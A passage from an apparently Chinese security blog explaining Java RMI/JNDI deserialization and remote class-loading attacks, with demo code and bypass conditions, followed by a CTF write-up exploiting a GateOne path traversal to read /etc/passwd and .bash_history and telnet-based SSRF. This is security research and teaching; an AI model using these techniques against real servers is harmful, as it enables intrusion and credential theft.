31 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~.1q.~. .sq.~...</span><br><span class="line">    000008D0  ff ff ff fe 70 71 00 7e  00 38 71 00 7e 00 39 71   ....pq.~ .8q.~.9q</span><br><span class="line">    000008E0  00 7e 00 3a 71 00 7e 00  10 71 00 7e 00 11 73 71   .~.:q.~. .q.~..sq</span><br><span class="line">    000008F0  00 7e 00 0b 02 00 00 02  a4 70 71 00 7e 00 43 71   .~...... .pq.~.Cq</span><br><span class="line">    00000900  00 7e 00 40 71 00 7e 00  35 71 00 7e 00 31 71 00   .~.@q.~. 5q.~.1q.</span><br><span class="line">    00000910  7e 00 11 73 71 00 7e 00  0b 02 00 00 04 68 70 74   ~..sq.~. .....hpt</span><br><span class="line">    00000920  00 27 6a 61 76 61 2e 75  74 69 6c 2e 63 6f 6e 63   .&#39;java.u til.conc</span><br><span class="line">    00000930  75 72 72 65 6e 74 2e 54  68 72 65 61 64 50 6f 6f   urrent.T hreadPoo</span><br><span class="line">    00000940  6c 45 78 65 63 75 74 6f  72 74 00 17 54 68 72 65   lExecuto rt..Thre</span><br><span class="line">    00000950  61 64 50 6f 6f 6c 45 78  65 63 75 74 6f 72 2e 6a   adPoolEx ecutor.j</span><br><span class="line">    00000960  61 76 61 74 00 09 72 75  6e 57 6f 72 6b 65 72 71   avat..ru nWorkerq</span><br><span class="line">    00000970  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000980  00 00 02 74 70 74 00 2e  6a 61 76 61 2e 75 74 69   ...tpt.. java.uti</span><br><span class="line">    00000990  6c 2e 63 6f 6e 63 75 72  72 65 6e 74 2e 54 68 72   l.concur rent.Thr</span><br><span class="line">    000009A0  65 61 64 50 6f 6f 6c 45  78 65 63 75 74 6f 72 24   eadPoolE xecutor$</span><br><span class="line">    000009B0  57 6f 72 6b 65 72 71 00  7e 00 4b 71 00 7e 00 35   Workerq. ~.Kq.~.5</span><br><span class="line">    000009C0  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000009D0  02 00 00 03 42 70 74 00  10 6a 61 76 61 2e 6c 61   ....Bpt. .java.la</span><br><span class="line">    000009E0  6e 67 2e 54 68 72 65 61  64 74 00 0b 54 68 72 65   ng.Threa dt..Thre</span><br><span class="line">    000009F0  61 64 2e 6a 61 76 61 71  00 7e 00 35 71 00 7e 00   ad.javaq .~.5q.~.</span><br><span class="line">    00000A00  10 71 00 7e 00 11 73 72  00 1f 6a 61 76 61 2e 75   .q.~..sr ..java.u</span><br><span class="line">    00000A10  74 69 6c 2e 43 6f 6c 6c  65 63 74 69 6f 6e 73 24   til.Coll ections$</span><br><span class="line">    00000A20  45 6d 70 74 79 4c 69 73  74 7a b8 17 b4 3c a7 9e   EmptyLis tz...&lt;..</span><br><span class="line">    00000A30  de 02 00 00 70 78 70 78                            ....pxpx</span><br></pre></td></tr></table></figure>

<p>看到一堆 <code>ac ed 00 05</code>, 就可以证明漏洞的来源了, 原因就是 RMI 协议是基于 java 自带的序列化的. 如果参数类型是 Object, 直接传 payload 就行了. 如果不是 Object 但是是类型是接口, 我们可以通过 Proxy 给 ysoseiral 的 payload 套一层, 也能直接打服务端. 不过比较麻烦的是 java 的动态代理只能代理 Interface, 所以如果形参类型是 String, HashMap 等就没办法了. 另外可以看到异常 <code>java.lang.NullPointerException</code> 是服务提供者发给客户端的, 好像有通过这种方式回显消息的打法, 也是很骚的.  </p>
<p>另外实际以前上在 bind 给 <code>Registry</code> 等等地方都是可以打的 (ysoseiral 也有对应的 payload), 因为也都是通过反序列化传数据, 不过在一次更新中 java 官方加了限制 (可以看参考文文章 [7]). 在这种地方只能反序列化在白名单里面的类, 不过仍然找到了通过 JRMPClient 的方法来打. 可惜的是最新版本我测试的情况是 JRMPClient 也给修复了, 可以收到 Registry 发的 JRMP 请求, 但是不能成功反序列化, 甚至连异常都没有, 估计仍然是白名单过滤掉了. 所以这方面目前只能通过我上面的说的参数方式来反序列化打服务提供者了.  </p>
<p>大概是打客户端:<br>直接改 ysoseiral.exploit.JRMPListener.java, 返回恶意 gadgets 即可, 这在 JNDI lookup 都时候也可以用.  </p>
<p>打注册局:<br>用 ysoseiral.exploit.RMIRegistryExploit.java + 略微修改过的 ysoseiral.exploit.JRMPClient.java.  </p>
<p>打服务提供者:<br>把参数用恶意对象替换就可以了, 对参数类型有限制.  </p>
<p>Update:<br>看到了国外的研究, <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a>  </p>
<p>可以通过 hook 类方法来直接更改传过去的参数, 绕过部分的限制.  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Unrecognized primitive type: "</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var0 == String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要不是 Interger, String 等直接用对应方法读出的原始类, 就算不是接口类也能通过运行时强行改参数去打, 刚好可以结合之前写的 rasp 完成.  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmb122.easyrasp.hooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.annotation.HookHandler;</span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.enums.HookType;</span><br><span class="line"><span class="keyword">import</span> demo.rmb122.DeserializeObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestHook</span> </span>&#123;</span><br><span class="line">    <span class="meta">@HookHandler</span>(hookClass = <span class="string">"java.rmi.server.RemoteObjectInvocationHandler"</span>, hookMethod = <span class="string">"invokeRemoteMethod"</span>, hookType = HookType.BEFORE_RUN)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object[] test(Object self, Object[] args) &#123;</span><br><span class="line">        System.out.println(<span class="string">"test"</span>);</span><br><span class="line">        System.out.println(Arrays.toString((Object[]) args[<span class="number">2</span>]));</span><br><span class="line">        ((Object[]) args[<span class="number">2</span>])[<span class="number">0</span>] = (Object) <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        <span class="keyword">return</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然弹出异常说类型错误, 但可以成功触发反序列化.  </p>
<h2 id="加载远程类"><a href="#加载远程类" class="headerlink" title="加载远程类"></a>加载远程类</h2><p>RMIServer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.codebase"</span>, <span class="string">"http://127.0.0.1:19132/"</span>);</span><br><span class="line"></span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RMISecurityManager;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.security.policy"</span>, RMIClient.class.getClassLoader().getResource(<span class="string">"java.policy"</span>).getFile());</span><br><span class="line">        RMISecurityManager securityManager = <span class="keyword">new</span> RMISecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Server 设置一个 <code>java.rmi.server.codebase</code>, 这样客户端在 lookup 时发现用到了一个本地不存在的类, 会去从这个 codebase 上加载.<br>在新版里面已经被修复, 利用起来可以用 <code>marshalsec</code>, 更方便.  </p>
<h1 id="JDNI"><a href="#JDNI" class="headerlink" title="JDNI"></a>JDNI</h1><h2 id="与-RMI-的关系"><a href="#与-RMI-的关系" class="headerlink" title="与 RMI 的关系"></a>与 RMI 的关系</h2><p>JNDI 全名 <code>Java Naming and Directory Interface</code>, 可以看到其实就是将多种协议, 例如远程方法调用 (RMI), 公共对象请求代理体系结构 (CORBA), 轻型目录访问协议 (LDAP) 或域名服务 (DNS). 全部封装到一个接口中, 方便使用.  </p>
<p>所以以下代码:  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        TestObject object = (TestObject) context.lookup(<span class="string">"rmi://localhost:9999/test"</span>);</span><br><span class="line">        object.callMe(<span class="keyword">new</span> DummyImpl());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与 RMIClient 是完全一样的.<br>不同的是 JNDI 在这基础上加了不少功能, </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">10000</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"test"</span>,<span class="string">"com.rmb122"</span>, <span class="string">"http://127.0.0.1:19133/"</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.rebind(<span class="string">"wrapper"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如这个 Reference, 客户端查询 wrapper 时, 因为是 <code>Reference</code> 且 com.rmb122 这个工厂类不存在, 将会去 codebase <code>http://127.0.0.1:19133/</code> 上加载, 利用方式与 rmi 远程对象加载是一样的.<br>在新版中已经修复, 需要手动打开 <code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>. 而且在我亲测的时候, 就算打开也没用了, 返回的是 <code>Reference</code> 对象 233. Debug 了一下发现还需要打开 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>, 这才会真正去用 http 协议加载类. 同时因为这是 JNDI 加的内容, 对 RMIClient 是无效的. 会直接返回 Reference 对象.  </p>
<h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h2><p>这其实与 RMI 差不多, 就是换了壳, 不同的地方是 ldap 是有索引等概念的, 可以搜索啊之类的, 且返回的对象也比较复杂, 本身就额外套了一层, 有一些特殊的属性. 具体可以看看底下的参考资料.<br>其中值得一说的是有个属性可以附带反序列化对象, 可以用于高版本 jre 下的 fastjson 打本地反序列化 gadget.  </p>
<h2 id="本地-Class-作为-Reference-Factory"><a href="#本地-Class-作为-Reference-Factory" class="headerlink" title="本地 Class 作为 Reference Factory"></a>本地 Class 作为 Reference Factory</h2><p>上面的是 Reference 是 <code>Reference(&quot;MyClass&quot;,&quot;com.rmb122&quot;, &quot;http://127.0.0.1:19133/&quot;);</code>, 第二个其实就是工厂类, 这里可以利用 <code>org.apache.naming.factory.BeanFactory</code> 这个工厂类来配合, 绕过远程加载的限制. 详细可以看看参考资料 [3].  </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大概如下:<br>RMI remote codebase:<br>需要 <code>java.rmi.server.useCodebaseOnly=true</code> 且需要设置 SecurityManager, 比较不实用  </p>
<p>RMI 打 Service Provider:<br>如果已知一个接口声明, 大部分情况下可以打.  </p>
<p>RMI 打 Registry:<br>老版本直接用 ysoserial 的 payload 打, 新版本可以尝试用 JRMP Client 的 payload 改一改尝试绕过.  </p>
<p>JNDI + RMI lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 直接爆出异常<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> 返回 Reference 对象<br>如果要利用需要两个选项都 =true  </p>
<p>JNDI + LDAP lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 无影响<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> 返回 Reference 对象<br>只需要 com.sun.jndi.ldap.object.trustURLCodebase=true 即可利用  </p>
<p>JNDI + LDAP 打本地反序列化, 或者 RMI 反序列化:<br>目前无限制  </p>
<p>JNDI + LDAP 打本地 Reference Factory:<br>目前无限制  </p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a><br>[2] <a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br>[3] <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>[4] <a href="https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java" target="_blank" rel="noopener">https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java</a><br>[5] <a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener">https://www.cnblogs.com/Welk1n/p/11066397.html</a><br>[6] <a href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/" target="_blank" rel="noopener">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/</a><br>[7] <a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/" target="_blank" rel="noopener">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a><br>[8] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Ogeek Easy Realworld Challenge 1&amp;2 Writeup</title>
    <url>/2019/08/28/Ogeek-Easy-Realworld-Challenge-1-2-Writeup/</url>
    <content><![CDATA[<p>这次 Ogeek 的 web 都挺有意思. 这两题偏向代码审计, 而且如题目名 <code>Easy Realworld</code>, 都是审计应用本身的漏洞, 差不多就是找 0day 了, 在这里分享给大家.</p>
<a id="more"></a>

<h2 id="Ogeek-Easy-Realworld-Challenge-1"><a href="#Ogeek-Easy-Realworld-Challenge-1" class="headerlink" title="Ogeek Easy Realworld Challenge 1"></a>Ogeek Easy Realworld Challenge 1</h2><p>打开网页, 发现是个在线 ssh 连接器, 根据写的大大 <code>Gateone</code>, 在 github 上找到 <code>https://github.com/liftoff/GateOne</code>, 而且上次更新是 2017 年, 很可能存在未修复漏洞. 先 fuzz 了一波没有什么收获, 而且几乎是刚开箱的状态, 于是尝试代码审计.  </p>
<p>根据 <code>run_gateone.py</code> 里面的  </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gateone.core.server <span class="keyword">import</span> main</span><br><span class="line"></span><br><span class="line">main(installed=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>找到 web 服务 <code>gateone/core/server.py</code>,<br>在 3692 行可以找到 设置 Handler 的地方, </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">handlers = [</span><br><span class="line">            (index_regex, MainHandler),</span><br><span class="line">            (<span class="string">r"%sws"</span> % url_prefix,</span><br><span class="line">                ApplicationWebSocket, dict(apps=APPLICATIONS)),</span><br><span class="line">            (<span class="string">r"%sauth"</span> % url_prefix, AuthHandler),</span><br><span class="line">            (<span class="string">r"%sdownloads/(.*)"</span> % url_prefix, DownloadHandler),</span><br><span class="line">            (<span class="string">r"%sdocs/(.*)"</span> % url_prefix, tornado.web.StaticFileHandler, &#123;</span><br><span class="line">                <span class="string">"path"</span>: docs_path,</span><br><span class="line">                <span class="string">"default_filename"</span>: <span class="string">"index.html"</span></span><br><span class="line">            &#125;)</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure>

<p>可以发现 <code>downloads/</code> 用的不是 tornado 自带的 StaticFileHandler, 而是作者自己造的轮子, 可能存在漏洞.<br>在 924 行可以找到 get 方法的定义  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, path, include_body=True)</span>:</span></span><br><span class="line">        session_dir = self.settings[<span class="string">'session_dir'</span>]</span><br><span class="line">        user = self.current_user</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> <span class="string">'session'</span> <span class="keyword">in</span> user:</span><br><span class="line">            session = user[<span class="string">'session'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.error(_(<span class="string">"DownloadHandler: Could not determine use session"</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="comment"># Something is wrong</span></span><br><span class="line">        filepath = os.path.join(session_dir, session, <span class="string">'downloads'</span>, path)</span><br><span class="line">        abspath = os.path.abspath(filepath)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(abspath):</span><br><span class="line">            self.set_status(<span class="number">404</span>)</span><br><span class="line">            self.write(self.get_error_html(<span class="number">404</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(abspath):</span><br><span class="line">            <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">403</span>, <span class="string">"%s is not a file"</span>, path)</span><br><span class="line">        <span class="keyword">import</span> stat, mimetypes</span><br><span class="line">        stat_result = os.stat(abspath)</span><br><span class="line">        modified = datetime.fromtimestamp(stat_result[stat.ST_MTIME])</span><br><span class="line">        self.set_header(<span class="string">"Last-Modified"</span>, modified)</span><br><span class="line">        mime_type, encoding = mimetypes.guess_type(abspath)</span><br><span class="line">        <span class="keyword">if</span> mime_type:</span><br><span class="line">            self.set_header(<span class="string">"Content-Type"</span>, mime_type)</span><br><span class="line">        <span class="comment"># Set the Cache-Control header to private since this file is not meant</span></span><br><span class="line">        <span class="comment"># to be public.</span></span><br><span class="line">        self.set_header(<span class="string">"Cache-Control"</span>, <span class="string">"private"</span>)</span><br><span class="line">        <span class="comment"># Add some additional headers</span></span><br><span class="line">        self.set_header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>)</span><br><span class="line">        <span class="comment"># Check the If-Modified-Since, and don't send the result if the</span></span><br><span class="line">        <span class="comment"># content has not been modified</span></span><br><span class="line">        ims_value = self.request.headers.get(<span class="string">"If-Modified-Since"</span>)</span><br><span class="line">        <span class="keyword">if</span> ims_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">import</span> email.utils</span><br><span class="line">            date_tuple = email.utils.parsedate(ims_value)</span><br><span class="line">            if_since = datetime.fromtimestamp(time.mktime(date_tuple))</span><br><span class="line">            <span class="keyword">if</span> if_since &gt;= modified:</span><br><span class="line">                self.set_status(<span class="number">304</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># Finally, deliver the file</span></span><br><span class="line">        <span class="keyword">with</span> io.open(abspath, <span class="string">"rb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line">            hasher = hashlib.sha1()</span><br><span class="line">            hasher.update(data)</span><br><span class="line">            self.set_header(<span class="string">"Etag"</span>, <span class="string">'"%s"'</span> % hasher.hexdigest())</span><br><span class="line">            <span class="keyword">if</span> include_body:</span><br><span class="line">                self.write(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">assert</span> self.request.method == <span class="string">"HEAD"</span></span><br><span class="line">                self.set_header(<span class="string">"Content-Length"</span>, len(data))</span><br></pre></td></tr></table></figure>

<p>注意关键部分,  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filepath = os.path.join(session_dir, session, <span class="string">'downloads'</span>, path)</span><br><span class="line">abspath = os.path.abspath(filepath)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(abspath):</span><br><span class="line">    self.set_status(<span class="number">404</span>)</span><br><span class="line">    self.write(self.get_error_html(<span class="number">404</span>))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(abspath):</span><br><span class="line">    <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">403</span>, <span class="string">"%s is not a file"</span>, path)</span><br></pre></td></tr></table></figure>
<p>可以看到没有任何的过滤, 就把 <code>path</code> 拼进了 <code>filepath</code>, 存在目录穿越, 可以任意文件读.  </p>
<p><img src="https://i.loli.net/2019/08/26/JbZuMYALTe7ivFn.png" alt=""></p>
<p>读 <code>/etc/passwd</code> 找到用户 ctf, 继续 fuzz 一些常用文件, 可以读到 <code>/home/ctf/.bash_history</code>,  </p>
<p><img src="https://i.loli.net/2019/08/26/5Ay41drtXPIopGT.png" alt=""></p>
<p>给了 <code>ftp niconiconi</code> 这应该就是题目描述里的内网机器了, 但是我们此时并没有连接 ftp 服务的能力.<br>继续审计源码, 可以发现 <code>gateone/applications/terminal/plugins/ssh/scripts/ssh_connect.py</code> 里的  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> protocol == <span class="string">'telnet'</span>:</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        print(_(<span class="string">'Connecting to telnet://%s@%s:%s'</span> % (user, host, port)))</span><br><span class="line">        <span class="comment"># Set title</span></span><br><span class="line">        print(<span class="string">"\x1b]0;telnet://%s@%s\007"</span> % (user, host))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(_(<span class="string">'Connecting to telnet://%s:%s'</span> % (host, port)))</span><br><span class="line">        <span class="comment"># Set title</span></span><br><span class="line">        print(<span class="string">"\x1b]0;telnet://%s\007"</span> % host)</span><br><span class="line">    telnet_connect(user, host, port)</span><br></pre></td></tr></table></figure>

<p>可以发现其实支持 <code>telnet</code>, 只是没有写出来…, 而 <code>telnet</code> 基本上跟 <code>nc</code> 差不多, 我们可以手敲 ftp 命令来获取 flag<br>随便试一下, 发现 <code>ctf</code>, <code>ctf</code> 就是账号密码  </p>
<p><img src="https://i.loli.net/2019/08/26/mhANxTvoCfXYMaQ.png" alt="">  </p>
<p><img src="https://i.loli.net/2019/08/26/OqzgWR47sx3NED9.png" alt=""></p>
<p>这里注意 ftp 传输文件还需要开另一个链接, 可以选择客户端链接服务器 (PASV) 或者 服务器链接客户端 (PORT), 这里当然是客户端链接服务器.<br>服务器会返回一个 (ip1, ip2, ip3, ip4, p1, p2), p1 * 256 + p2 就是我们需要链接的端口, 然后用 RERT 命令就能读取文件了.  </p>
<p>这里还有个小插曲, 这个应用还自带回放功能, 于是可以偷看别人的 flag…</p>
<p><img src="https://i.loli.net/2019/08/26/7tXZLBCm8nVlvuU.png" alt="">  </p>
<p>所以我猜后面改题目, 把 flag 设成一半在本机 <code>/flag</code> 上, 一半在内网 ftp 的原因就是这个 2333<br>而且后面又改了一次, 还加了一题 <code>Easy Realworld Challenge 2</code>, 可能就是某位大佬发现的 RCE 导致了非预期  </p>
<h2 id="Ogeek-Easy-Realworld-Challenge-2"><a href="#Ogeek-Easy-Realworld-Challenge-2" class="headerlink" title="Ogeek Easy Realworld Challenge 2"></a>Ogeek Easy Realworld Challenge 2</h2><p>到我们目前的能力是任意文件读取 + SSRF, 根据题目描述, 应该是得拿到 shell 才能读 flag 了. 于是只能继续审计源码 233  </p>
<p>可以看到在 ssh 链接时, 是直接拼的命令, 然后放到一个文件里面调用 execvpe 执行 /bin/sh 来跑这个命令, 但是过滤还是很严格的, 没办法注入命令, </p>
